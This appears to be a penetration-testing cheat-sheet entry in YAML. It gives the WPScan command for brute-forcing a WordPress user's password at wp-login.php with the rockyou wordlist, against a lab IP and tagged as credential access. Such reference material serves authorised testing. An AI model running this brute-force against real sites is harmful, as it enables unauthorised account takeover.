---
description: |
  Once a valid WordPress username has been identified through enumeration, WPScan can perform a password brute-force attack against the wp-login.php authentication endpoint using a wordlist, attempting to recover valid credentials for that account.

  Command Reference:

  	Target URL: http://10.10.10.1/

  	Username: john

  	Wordlist: /usr/share/wordlists/rockyou.txt

command: |
  wpscan --url http://10.10.10.1/ --usernames john --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
items:
  - Username
services:
  - Web
OS:
  - Linux
phases:
  - CredentialAccess
references:
  - https://github.com/wpscanteam/wpscan
  - https://wpscan.com/docs
---
